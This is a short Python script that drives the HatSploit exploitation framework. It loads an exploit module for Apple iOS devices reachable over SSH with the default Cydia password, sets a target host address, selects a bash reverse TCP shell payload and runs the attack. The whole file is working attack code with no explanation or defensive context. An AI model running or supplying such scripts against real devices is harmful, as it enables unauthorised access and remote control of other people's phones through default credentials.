from hatsploit.lib.runtime import Runtime
from hatsploit.lib.modules import Modules

runtime = Runtime()
modules = Modules()

runtime.start()
modules.use_module("exploit/apple_ios/ssh/cydia_default_password")

runtime.update()

modules.set_current_module_option('HOST', '192.168.1.68')
modules.set_current_module_option('PAYLOAD', 'unix/generic/bash_reverse_tcp')
modules.run_current_module()
